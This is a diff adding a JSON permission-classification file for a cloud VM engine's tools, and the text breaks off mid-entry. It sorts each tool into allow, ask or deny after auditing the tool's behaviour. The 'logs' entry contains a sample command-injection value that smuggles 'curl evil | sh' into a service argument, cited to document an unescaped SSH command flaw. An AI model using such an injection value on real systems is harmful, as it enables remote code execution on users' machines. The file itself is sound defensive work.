@@ -1,0 +1,732 @@
+{
+  "$comment": "Golden classification of every cloudru-vm engine tool -> permission action. METHOD (corrected 2026-08-10): permission=allow requires a BEHAVIOUR audit of the tool's engine handler (read the handle* in engine/internal/mcp at pinned baseline engineSha256) proving it passes BOTH hazard axes. AXIS 1 (read-only): genuinely read-only — no persistent state write (except a LOCAL plan file, noted per-entry), no downstream s.callTool, no job advancement, no secret material returned. AXIS 2 (SHELL-REACH, added AM-2 2026-08-10, cross-model QE HIGH): the handler does NOT pass any user-controlled argument into a shell/exec/SSH command (Deployer.Exec, session.CombinedOutput, a string-concatenated `docker …/kubectl …/compose …` command, or exec.Command). A tool that reaches a shell with a user arg is `ask` at MINIMUM — the brake can only set the permission, it CANNOT escape the arg (that is the engine's bug, not something the classifier can fix). The former shape heuristic ('no confirmed prop in schema => read-only') was FALSE-SAFE: stack_status had no confirmed prop yet advances jobs and invokes paid create tools (AXIS 1); `logs` was `allow` yet concatenates its user `service` arg RAW into a remote `docker compose logs <service>` over SSH — a command-injection/RCE path (AXIS 2, engine/logs.go:61 → ssh.go:117). Schema shape (confirmed prop) remains sufficient evidence for ask, never for allow. ENGINE INJECTION FLAGGED to the author (licence-blocked, NOT fixed here — see ADR-004 AM-2): the engine must shell-escape opts.Service and audit every `cmd +=` concatenation. Re-audit of ALL current allow tools against AXIS 2 found `logs` the ONLY shell-reaching allow tool; every other shell site (vm_exec, deploy, deploy_apply/captainkeys, k8s_kubectl/k8s_apply/k8s_helm) is already ask, and k8s_kubectl is additionally veto-hooked. Reclassifying a tool must show up in this diff (ADR-010 golden-snapshot discipline). A tool present in a live tools/list but absent here MUST fail the drift test — deny-by-default.",
+  "engineSha256": "59f83fc0678b95146ca539764d0c805bd2514b8588f198c1e835b26e54c05124",
+  "toolCount": 144,
+  "counts": {
+    "ask": 65,
+    "deny": 2,
+    "allow": 77
+  },
+  "tools": {
+    "deploy": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "mutating WITHOUT engine gate — MEASURED 05 §2.2 / ADR-004 Context"
+    },
+    "provision": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "mutating WITHOUT engine gate — MEASURED 05 §2.2 / ADR-004 Context"
+    },
+    "status": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleStatus (tools.go:1720) reads the LOCAL state file (state.Read) — no cloud call, no state write, no downstream tool call."
+    },
+    "list": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleList (tools.go:1736) reads the LOCAL state file — no cloud call, no state write, no downstream tool call."
+    },
+    "vm_list": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleVMList (tools_vmexec.go:111) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "vm_exec": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "mutating WITHOUT engine gate — MEASURED 05 §2.2 / ADR-004 Context"
+    },
+    "vm_get": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleVMGet (tools_vm.go:23) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "logs": {
+      "effect": "shell-reach",
+      "permission": "ask",
+      "why": "RECLASSIFIED allow→ask 2026-08-10 (AM-2, shell-reach hazard axis, cross-model QE HIGH): NOT read-only in the safe sense. handleLogs (tools.go:1758) passes the user-controlled `service` arg into engine.Logs, which CONCATENATES it RAW/unescaped into a remote shell command — `cmd += \" \" + opts.Service` (engine/logs.go:61) → e.Deployer.Exec (logs.go:64) → SSH session.CombinedOutput (internal/deploy/ssh.go:117). So service=\"app; curl evil | sh\" executes arbitrary commands on the user's VM: a command-injection/RCE path behind a silent allow, defeating the ADR-004 brake for an autonomous agent with cloud creds. The permission layer can only PROMPT; it cannot escape the arg (that is the engine's bug — flagged ADR-004 AM-2, licence-blocked). The prior audit's claim of a \"FIXED docker compose logs\" was WRONG: the command is NOT fixed."
+    },
+    "destroy": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "list_zones": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleListZones (tools.go:1871) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "list_images": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleListImages (tools.go:1889) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "deploy_plan": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited: creates NO cloud resource — handleDeployPlan (tools_deploy.go:49) resolves via read-only lookups (deployplan.Resolve) and persists a LOCAL plan file (deployplan.Save); consumed only by ask-gated deploy_apply."
+    },
+    "deploy_apply": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "list_flavors": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleListFlavors (tools_deploy.go:230) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "list_disk_types": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleListDiskTypes (tools_deploy.go:257) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "list_subnets": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleListSubnets (tools_deploy.go:274) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "list_security_groups": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleListSecurityGroups (tools_deploy.go:291) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "list_floating_ips": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleListFloatingIPs (tools_deploy.go:482) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "open_ports": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "k8s_list": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleK8sList (tools_k8s.go:63) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "k8s_get": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleK8sGet (tools_k8s.go:80) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "k8s_options": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleK8sOptions (tools_k8s.go:97) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "k8s_plan": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleK8sPlan (tools_k8s.go:260) is a pure preview — resolveK8sPlan builds the CreateClusterReq but nothing is created or saved; creation lives in ask-gated k8s_create."
+    },
+    "k8s_create": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "k8s_kubeconfig": {
+      "effect": "sensitive-read",
+      "permission": "ask",
+      "why": "emits cluster-admin credentials; stricter than ADR-004 (which is silent) — safe direction"
+    },
+    "k8s_delete": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "k8s_nodepools": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleK8sNodePools (tools_k8s.go:385) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "k8s_add_nodepool": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "k8s_kubectl": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "k8s_apply": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "k8s_helm": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "disk_list": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleDiskList (tools_disk.go:35) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "disk_create": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "disk_attach": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "disk_detach": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "disk_resize": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "disk_delete": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "ca_list": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleCaList (tools_ca.go:23) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "ca_get": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleCaGet (tools_ca.go:39) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "ca_deploy": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "ca_delete": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "ca_logs": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleCaLogs (tools_ca.go:153) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "ca_start": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "mutating WITHOUT engine gate — MEASURED 05 §2.2 / ADR-004 Context"
+    },
+    "ca_stop": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "mutating WITHOUT engine gate — MEASURED 05 §2.2 / ADR-004 Context"
+    },
+    "iam_service_accounts": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleIamServiceAccounts (tools_admin.go:59) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "org_projects": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleOrgProjects (tools_admin.go:81) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "org_quotas": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleOrgQuotas (tools_admin.go:103) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "release_floating_ip": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "snat_list": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleSnatList (tools_snat.go:43) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "snat_create": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "snat_delete": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "pg_list": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handlePgList (tools_pg.go:107) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "pg_get": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handlePgGet (tools_pg.go:129) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "pg_versions": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handlePgVersions (tools_pg.go:150) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "pg_specs": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handlePgSpecs (tools_pg.go:162) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "pg_create": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "pg_delete": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "pg_operation": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handlePgOperation (tools_pg.go:212) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "kafka_list": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleKafkaList (tools_kafka.go:86) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "kafka_get": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleKafkaGet (tools_kafka.go:105) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "kafka_versions": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleKafkaVersions (tools_kafka.go:121) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "kafka_specs": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleKafkaSpecs (tools_kafka.go:133) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "kafka_create": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "kafka_delete": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "kafka_operation": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleKafkaOperation (tools_kafka.go:263) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "redis_list": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleRedisList (tools_redis.go:27) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "redis_get": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleRedisGet (tools_redis.go:46) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "redis_versions": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleRedisVersions (tools_redis.go:62) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "redis_specs": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleRedisSpecs (tools_redis.go:74) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "redis_create": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "redis_delete": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "redis_operation": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleRedisOperation (tools_redis.go:237) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "pg_databases": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handlePgDatabases (tools_pg.go:459) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "pg_db_create": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "pg_db_delete": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "pg_users": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handlePgUsers (tools_pg.go:524) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "pg_user_create": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "pg_user_delete": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "pg_backups": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handlePgBackups (tools_pg.go:584) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "pg_backup_create": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "lb_list": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleLbList (tools_nlb.go:52) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "lb_get": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleLbGet (tools_nlb.go:72) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "lb_operation": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleLbOperation (tools_nlb.go:88) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "tg_list": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleTgList (tools_nlb.go:119) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "tg_get": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleTgGet (tools_nlb.go:135) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "tg_create": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "tg_delete": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "lb_create": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "lb_delete": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "vpc_list": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleVpcList (tools_vpc.go:25) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "vpc_get": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleVpcGet (tools_vpc.go:41) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "vpc_create": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "vpc_delete": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "vpc_operation": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleVpcOperation (tools_vpc.go:104) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "vpc_routes": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleVpcRoutes (tools_vpc.go:135) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "vpc_route_create": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "vpc_route_delete": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "dns_zones": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleDnsZones (tools_dns.go:33) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "dns_zone_get": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleDnsZoneGet (tools_dns.go:55) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "dns_zone_create": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "dns_zone_delete": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "dns_operation": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleDnsOperation (tools_dns.go:133) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "dns_records": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleDnsRecords (tools_dns.go:180) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "dns_record_get": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleDnsRecordGet (tools_dns.go:200) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "dns_record_create": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "dns_record_delete": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "secret_list": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleSecretList (tools_secret.go:24) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "secret_get": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleSecretGet (tools_secret.go:40) returns secret METADATA only — client Get is GET /v2/secret/{path}, explicitly 'no value' (secret/client.go:123); the value path is secret_value (deny)."
+    },
+    "secret_value": {
+      "effect": "sensitive-read",
+      "permission": "deny",
+      "why": "plaintext secret into transcript/session logs (ADR-004 §1)"
+    },
+    "secret_create": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "secret_add_version": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "secret_delete": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "ar_list": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleArList (tools_ar.go:24) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "ar_get": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleArGet (tools_ar.go:43) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "ar_create": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "ar_delete": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "ar_operation": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleArOperation (tools_ar.go:117) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "billing_balance": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleBillingBalance (tools_billing.go:37) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "billing_consumption": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleBillingConsumption (tools_billing.go:79) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "billing_finops": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleBillingFinops (tools_billing.go:181) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "metrics_history": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleMetricsHistory (tools_monitoring.go:41) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "metrics_scrape": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleMetricsScrape (tools_monitoring.go:69) — ScrapeMetrics is a GET of the scrape endpoint (monitoring/client.go:160); no state write, no downstream tool call."
+    },
+    "audit_events": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleAuditEvents (tools_audit.go:23) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "cert_list": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleCertList (tools_certmanager.go:23) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "cert_get": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleCertGet (tools_certmanager.go:41) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "cert_issue_le": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "mutating WITHOUT engine gate — MEASURED 05 §2.2 / ADR-004 Context"
+    },
+    "cert_import": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "mutating WITHOUT engine gate — MEASURED 05 §2.2 / ADR-004 Context"
+    },
+    "cert_renew": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "mutating WITHOUT engine gate — MEASURED 05 §2.2 / ADR-004 Context"
+    },
+    "cert_delete": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "cert_usage": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleCertUsage (tools_certmanager.go:138) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "cert_versions": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleCertVersions (tools_certmanager.go:154) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "cert_private_key": {
+      "effect": "sensitive-read",
+      "permission": "deny",
+      "why": "plaintext secret into transcript/session logs (ADR-004 §1)"
+    },
+    "cert_operation": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleCertOperation (tools_certmanager.go:193) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "s3_buckets": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleS3Buckets (tools_s3.go:24) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "s3_ls": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleS3Ls (tools_s3.go:36) makes only read/list/get client calls — no state write, no downstream tool call, no job advancement."
+    },
+    "s3_get": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited read-only: handleS3Get (tools_s3.go:52) — GetObject read of user object bytes; no state write, no downstream tool call."
+    },
+    "s3_put": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "mutating WITHOUT engine gate — MEASURED 05 §2.2 / ADR-004 Context"
+    },
+    "s3_rm": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "s3_bucket_create": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "mutating WITHOUT engine gate — MEASURED 05 §2.2 / ADR-004 Context"
+    },
+    "s3_bucket_delete": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "stack_plan": {
+      "effect": "read-only",
+      "permission": "allow",
+      "why": "behaviour-audited: creates NO cloud resource — handleStackPlan (tools_stack.go:297) plans and persists a LOCAL job file only (job.Save :318); its cloud calls are read-only (ListFlavors tools_stack.go:363, ListBuckets :396). Upstream smell: the saved planned job is later ADVANCED by stack_status — which is why stack_status is ask (see its entry)."
+    },
+    "stack_apply": {
+      "effect": "mutating",
+      "permission": "ask",
+      "why": "engine schema declares confirmed prop (gated upstream; belt-plus-braces per ADR-004 §3)"
+    },
+    "stack_status": {
+      "effect": "mutating",
+      "permission": "ask",
